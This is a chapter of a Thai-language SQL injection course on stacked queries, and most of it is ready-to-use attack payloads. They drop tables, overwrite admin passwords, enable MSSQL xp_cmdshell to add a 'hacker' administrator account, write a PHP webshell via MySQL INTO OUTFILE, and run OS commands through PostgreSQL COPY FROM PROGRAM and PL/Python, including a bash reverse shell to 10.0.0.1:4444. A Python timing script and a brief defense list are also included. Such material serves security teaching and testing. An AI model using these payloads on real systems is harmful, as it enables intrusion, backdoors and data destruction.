# Part 027: Stacked Queries และ Batch Injection

## ภาพรวม

Stacked Queries หรือ Batch SQL execution เป็นเทคนิคที่ใช้ semicolon (;) เพื่อรัน SQL statements หลายตัวใน query เดียว

**ขั้นตอนที่ 361-375**

---

## 361. Stacked Queries คืออะไร?

```sql
-- ปกติ: query เดียว
SELECT * FROM users WHERE id=1;

-- Stacked: หลาย queries
SELECT * FROM users WHERE id=1; DROP TABLE users;--

-- รันได้ทั้งหมดถ้า database driver หรือ library รองรับ
```

---

## 362. Database Support

```
MySQL:
  - mysqli_multi_query() → รองรับ
  - PDO + emulate_prepares → รองรับ
  - PDO ปกติ → ไม่รองรับ
  - Python mysql-connector → ยินยอม

MSSQL:
  - รองรับเสมอ→ VERY POWERFUL
  - ADO.NET, ODBC, OLE DB

PostgreSQL:
  - รองรับเสมอ
  - psycopg2 default รองรับ

SQLite:
  - executescript() → รองรับ
  - execute() → ไม่รองรับ
```

---

## 363. Stacked Queries Payloads

### 63.1 Basic Tests

```sql
-- ทดสอบว่ารองรับหรือไม่
1; SELECT SLEEP(5)--
1; SELECT 1--
1; WAITFOR DELAY '0:0:5'--

-- DDL Operations
1; DROP TABLE users--
1; CREATE TABLE hacked (data TEXT)--
1; ALTER TABLE users ADD COLUMN backdoor TEXT--

-- DML Operations
1; INSERT INTO users VALUES (999,'hacked','hacked','admin')--
1; UPDATE users SET password='hacked' WHERE username='admin'--
1; DELETE FROM users WHERE username='test'--
```

### 63.2 MSSQL Stacked Queries

```sql
-- Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1--
'; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell', 1--
'; RECONFIGURE--

-- Run command
'; EXEC xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'net user hacker P@ss123 /add'--
'; EXEC xp_cmdshell 'net localgroup administrators hacker /add'--

-- Store result in table
'; CREATE TABLE #out (data varchar(8000))--
'; INSERT INTO #out EXEC xp_cmdshell 'net user'--
'; SELECT data FROM #out--
```

### 63.3 MySQL Stacked Queries

```sql
-- Webshell upload
'; SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/backdoor.php'--

-- Create user (ถ้ามี permission)
'; CREATE USER 'hacker'@'%' IDENTIFIED BY 'P@ss123'--
'; GRANT ALL ON *.* TO 'hacker'@'%'--
```

---

## 364. Blind Stacked Queries

```python
import requests
import time

url = "http://example.com/item"
cookies = {"PHPSESSID": "abc123"}

def test_stacked_time(payload):
    start = time.time()
    r = requests.get(url, params={"id": payload}, cookies=cookies, timeout=15)
    elapsed = time.time() - start
    return elapsed

# ทดสอบ MySQL stacked
payloads = [
    "1; SELECT SLEEP(5)-- -",
    "1'; SELECT SLEEP(5)-- -",
    "1); SELECT SLEEP(5)-- -",
    "1'); SELECT SLEEP(5)-- -",
]

for p in payloads:
    elapsed = test_stacked_time(p)
    if elapsed >= 4:
        print(f"[+] STACKED QUERIES WORK! Payload: {p}")
        print(f"    Response time: {elapsed:.2f}s")
        break
    else:
        print(f"[-] {p[:50]}... ({elapsed:.2f}s)")
```

---

## 365. PostgreSQL Stacked Queries

```sql
-- COPY command
'; CREATE TABLE t (d text)--
'; COPY t FROM PROGRAM 'id'--
'; SELECT * FROM t--

-- PL/Python OS command
'; CREATE EXTENSION plpythonu--
'; CREATE OR REPLACE FUNCTION exec(c text) RETURNS text AS $$ import subprocess; return subprocess.check_output(c, shell=True).decode() $$ LANGUAGE plpythonu--
'; SELECT exec('id')--

-- Reverse shell
'; SELECT exec('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"')--
```

---

## 366. Defense และ Detection

```
การป้องกัน:
1. ใช้ Prepared Statements
2. Disable multi-query ใน driver
3. Monitor คำสั่ง SQL ที่มี semicolons
4. Principle of Least Privilege
5. WAF rules สำหรับ stacked queries

การตรวจจับ (Blue Team):
SELECT * FROM sys.dm_exec_requests -- MSSQL
-- ดูเพื่อหา multiple statements ผิดปกติ
```

---

## สรุป

Stacked Queries:
- **ทรงพลัง** - รันได้ทุก SQL statement
- **MSSQL** - xp_cmdshell, sp_configure
- **MySQL** - file write, UDF
- **PostgreSQL** - COPY, PL/Python
- **โครงสร้าง** - semicolon + driver support

---

*Part 027 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
